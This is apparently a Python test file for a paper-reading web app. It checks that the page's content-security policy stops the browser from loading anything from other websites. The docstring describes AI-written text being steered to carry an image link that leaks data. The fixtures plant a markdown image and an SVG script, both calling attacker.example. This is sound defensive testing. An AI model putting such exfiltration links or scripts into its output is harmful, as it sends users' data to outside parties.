"""unpacman's page loads nothing from another website (DESIGN §32, 2026-10-30).

Text an AI wrote — a companion, an answer, a key term — may hold an image whose
address is on any website, carrying whatever the AI was steered to put in it;
shown on the page, the browser fetched it at once, with no click (seen in
Chrome and WebKit). The renderer keeps drawing such an image: the page's
policy is what stops the browser from fetching it."""
from __future__ import annotations

import re

from deslopify.app import server
from test_app import (  # noqa: F401  (fixtures)
    GUIDE, app_cfg, client, needs_pdftotext, paper_with)

OWN = {"'self'", "data:", "blob:", "'none'"}


def _directives(policy: str) -> dict[str, list[str]]:
    return {part.split()[0]: part.split()[1:] for part in policy.split("; ")}


def test_the_page_loads_nothing_from_another_website(client):
    page = client.get("/")
    assert page.status_code == 200
    policy = page.headers["content-security-policy"]
    assert policy == server.PAGE_POLICY
    d = _directives(policy)
    assert d["default-src"] == ["'self'"]
    for name in ("img-src", "font-src", "connect-src", "worker-src"):
        assert set(d[name]) <= OWN, (name, d[name])
    assert d["connect-src"] == ["'self'"]
    assert d["script-src"] == ["'self'"]           # nothing inline, nothing evaluated
    assert set(d["style-src"]) == {"'self'", "'unsafe-inline'"}
    assert d["base-uri"] == ["'none'"] and d["frame-ancestors"] == ["'self'"]
    assert page.headers["referrer-policy"] == "same-origin"


def test_the_page_reached_as_a_file_is_held_to_the_same_policy(client):
    page = client.get("/static/index.html")
    assert page.status_code == 200
    assert page.headers["content-security-policy"] == server.PAGE_POLICY
    assert page.headers["referrer-policy"] == "same-origin"
    assert "content-security-policy" not in client.get("/static/app.js").headers


def test_the_page_has_nothing_inline_that_its_policy_would_stop():
    """The policy allows no inline script, no evaluated code: the page and its
    scripts must need neither — else a feature would silently stop working."""
    page = (server.WEB_DIR / "index.html").read_text(encoding="utf-8")
    assert re.findall(r"<script(?![^>]*\bsrc=)[^>]*>", page) == []
    assert not re.search(r"\son[a-z]+\s*=", page), "an inline handler"
    assert "javascript:" not in page
    for path in sorted(server.WEB_DIR.glob("*.js")):
        code = path.read_text(encoding="utf-8")
        for pattern, what in ((r"\beval\(", "eval"), (r"new Function\(", "new Function"),
                              (r"set(?:Timeout|Interval)\(\s*['\"`]", "a timer given code"),
                              (r"javascript:", "a javascript: address"),
                              (r"\bon[a-z]+:\s*['\"`]", "a handler given as text")):
            assert not re.search(pattern, code), f"{path.name}: {what}"


@needs_pdftotext
def test_an_outside_image_is_still_drawn_and_left_to_the_policy(app_cfg, client):
    """The companion is rendered as before — its own figures included — and an
    image from another website stays in it, for the browser to refuse."""
    guide = GUIDE.replace(
        "Parity survives addition.",
        "Parity survives addition.\n\n![a figure](https://attacker.example/p.png?d=1)")
    slug, _ = paper_with(app_cfg, client, guide=guide)
    companion = client.get(f"/api/papers/{slug}/companion").json()
    ideas = next(s["html"] for s in companion["sections"] if s["key"] == "main-ideas")
    assert '<img src="https://attacker.example/p.png?d=1"' in ideas
    assert "https:" not in " ".join(_directives(server.PAGE_POLICY)["img-src"])


@needs_pdftotext
def test_a_figure_opened_by_itself_is_shown_never_run(app_cfg, client):
    """An SVG figure with a script in it, opened in a tab of its own, would run
    as unpacman's page — and could read its key. It is shown in a sandbox."""
    slug, paper = paper_with(app_cfg, client)
    figures = paper.reading / "figures"
    figures.mkdir()
    drawing = ('<svg xmlns="http://www.w3.org/2000/svg">'
               '<script>fetch("https://attacker.example/")</script></svg>')
    (figures / "drawing.svg").write_text(drawing, encoding="utf-8")
    (figures / "parity.png").write_bytes(b"\x89PNG\r\n\x1a\nfigure")
    for name, body in (("drawing.svg", drawing.encode()),
                       ("parity.png", b"\x89PNG\r\n\x1a\nfigure")):
        served = client.get(f"/api/papers/{slug}/asset/figures/{name}")
        assert served.status_code == 200 and served.content == body
        policy = served.headers["content-security-policy"]
        assert policy.startswith("sandbox;") and "default-src 'none'" in policy
        assert served.headers["x-content-type-options"] == "nosniff"
